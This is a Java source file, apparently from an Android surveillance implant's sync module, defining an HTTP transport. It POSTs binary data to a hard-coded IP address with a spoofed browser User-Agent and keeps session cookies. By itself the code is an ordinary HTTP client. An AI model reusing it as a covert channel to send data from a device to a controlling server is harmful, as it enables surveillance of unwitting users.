package com.ht.RCSAndroidGUI.action.sync;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URI;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.params.ClientPNames;
import org.apache.http.client.params.CookiePolicy;
import org.apache.http.cookie.Cookie;
import org.apache.http.cookie.SetCookie;
import org.apache.http.impl.client.DefaultHttpClient;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.utils.Check;

public abstract class HttpTransport extends Transport {

	private static final int PORT = 80;

	// #ifdef DEBUG
	private static Debug debug = new Debug("HttpTransport");
	// #endif

	String host;

	public HttpTransport(String host) {
		//super("http://" + host + ":" + PORT + "/wc12/webclient");
		super("http://192.168.1.185:" + PORT + "/wc12/webclient");
		
		this.host = host;
		cookies = null;
		stop = false;
	}

	// private String transportId;
	private List<Cookie> cookies;

	boolean stop;
	boolean follow_moved = true;

	private final String HEADER_CONTENTTYPE = "content-type";
	private final String HEADER_SETCOOKIE = "set-cookie";
	private final String HEADER_CONTENTLEN = "content-length";

	// private final String USER_AGENT =
	// "Profile/MIDP-2.0 Configuration/CLDC-1.0";
	private final String CONTENT_TYPE = "application/octet-stream";
	static// private static String CONTENTTYPE_TEXTHTML = "text/html";
	boolean acceptWifi = false;

	public void close() {
		//cookies = null;
	}

	/**
	 * http://www.androidsnippets.com/executing-a-http-post-request-with-
	 * httpclient
	 * 
	 * @throws
	 * @throws ClientProtocolException
	 * 
	 */
	public synchronized byte[] command(byte[] data) throws TransportException {

		// sending request
		DefaultHttpClient httpclient = new DefaultHttpClient();
		//httpclient.getParams().setParameter(ClientPNames.COOKIE_POLICY, CookiePolicy.RFC_2965);
		
		HttpPost httppost = new HttpPost(baseurl);
		httppost.setHeader("User-Agent", "Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3");
		httppost.setHeader("Content-Type", "application/octet-stream");

		if (cookies != null) {
			for (Cookie cookie : cookies) {
				httpclient.getCookieStore().addCookie(cookie);
				//httppost.setHeader("Cookie", cookie.getName());
			}
		}

		DataInputStream in = null;

		try {
			httppost.setEntity(new ByteArrayEntity(data));
			HttpResponse response = httpclient.execute(httppost);

			int returnCode = response.getStatusLine().getStatusCode();

			if (returnCode == HttpStatus.SC_OK) {
				cookies = httpclient.getCookieStore().getCookies();

				long length = response.getEntity().getContentLength();

				in = new DataInputStream(response.getEntity().getContent());

				byte[] content = new byte[(int) length];
				in.readFully(content);

				in.close();

				return content;
			} else {
				return null;
			}
		} catch (Exception ex) {
			debug.error(ex);
			throw new TransportException(1);
		} finally {
			if (in != null) {
				try {
					in.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}

		// byte[] content = parseHttpConnection(connection);

	}

}